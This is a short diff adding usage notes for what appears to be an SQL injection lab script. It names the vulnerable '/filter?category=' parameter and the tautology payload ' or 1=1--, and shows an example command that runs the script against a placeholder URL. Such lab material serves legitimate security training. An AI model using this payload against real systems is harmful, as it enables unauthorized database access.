@@ -1,0 +1,7 @@
+Notes:
+- Exploitable parameter is "/filter?category=" and is set statically in the script
+- Payload for the script would be "' or 1=1--"
+
+
+Example usage:
+./sqli-lab-01.py http://example.com "' or 1=1--"
